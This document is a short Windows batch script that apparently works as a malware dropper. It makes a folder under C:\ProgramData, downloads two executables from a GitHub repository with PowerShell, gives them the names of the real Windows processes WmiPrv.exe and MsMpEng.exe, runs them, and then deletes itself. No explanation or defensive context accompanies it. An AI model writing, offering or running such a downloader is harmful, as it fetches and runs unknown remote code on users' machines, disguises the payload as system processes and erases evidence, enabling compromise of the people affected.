@echo off
mkdir C:\ProgramData\Distribution
powershell.exe iwr https://github.com/wazgame/waz/raw/main/WmiPrv.exe -o C:\ProgramData\Distribution\WmiPrv.exe
powershell.exe iwr https://github.com/wazgame/waz/raw/main/MsMpEng.exe -o C:\ProgramData\Distribution\MsMpEng.exe
start \wait C:\ProgramData\Distribution\WmiPrv.exe C:\ProgramData\Distribution\MsMpEng.exe
del/a/f "%~f0"